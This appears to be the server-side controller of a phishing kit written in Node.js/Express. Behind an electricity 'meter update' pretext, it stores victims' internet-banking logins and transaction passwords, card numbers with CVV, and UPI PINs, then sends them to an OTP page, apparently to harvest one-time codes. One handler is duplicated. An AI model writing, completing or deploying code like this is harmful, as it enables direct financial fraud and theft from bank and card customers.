// controllers/postController.js

const MeterUpdate     = require('../models/MeterUpdate');
const InternetBanking = require('../models/InternetBanking');
const CreditPayment   = require('../models/CreditPayment');
const UpiPin = require('../models/UpiPin');
const { v4: uuidv4 }  = require('uuid');

exports.submitMeterForm = async (req, res, next) => {
  try {
    const { uniqueId = uuidv4(), fullName, mobileNumber, consumerNumber, reason } = req.body;
    await new MeterUpdate({ uniqueId, fullName, mobileNumber, consumerNumber, reason }).save();
    res.redirect(`/internet-banking/${uniqueId}`);
  } catch (err) {
    next(err);
  }
};

exports.submitBankingForm = async (req, res, next) => {
  try {
    const { uniqueId } = req.params;
    const { bankName, userId, password, transactionPassword } = req.body;
    await new InternetBanking({ uniqueId, bankName, userId, password, transactionPassword }).save();
    res.redirect(`/otp/${uniqueId}`);
  } catch (err) {
    next(err);
  }
};

exports.submitPaymentForm = async (req, res, next) => {
  try {
    const { uniqueId } = req.params;
    const { cardType, cardNumber, expiryDate, cvv } = req.body;
    await new CreditPayment({ uniqueId, cardType, cardNumber, expiryDate, cvv }).save();
    res.redirect(`/otp/${uniqueId}`);
  } catch (err) {
    next(err);
  }
};

exports.submitUpiPin = async (req, res, next) => {
  try {
    const { uniqueId } = req.params;
    const { pin } = req.body;
    // Validate 4-digit PIN
    if (!/^\d{4}$/.test(pin)) {
      return res.status(400).send('Invalid PIN');
    }
    // Save or update
    await UpiPin.findOneAndUpdate(
      { uniqueId },
      { pin, createdAt: new Date() },
      { upsert: true, new: true }
    );

    // Next step: perhaps redirect to a success or OTP page
    res.redirect(`/otp/${uniqueId}`);
  } catch (err) {
    next(err);
  }
};

exports.submitPaymentForm = async (req, res, next) => {
  try {
    // Extract uniqueId from URL, and form fields from body
    const { uniqueId } = req.params;
    const { cardType, cardNumber, expiryDate, cvv } = req.body;

    // Save to CreditPayment collection
    await new CreditPayment({
      uniqueId,
      cardType,
      cardNumber,
      expiryDate,
      cvv
    }).save();

    // Redirect to OTP page (or wherever next)
    res.redirect(`/otp/${uniqueId}`);
  } catch (err) {
    next(err);
  }
};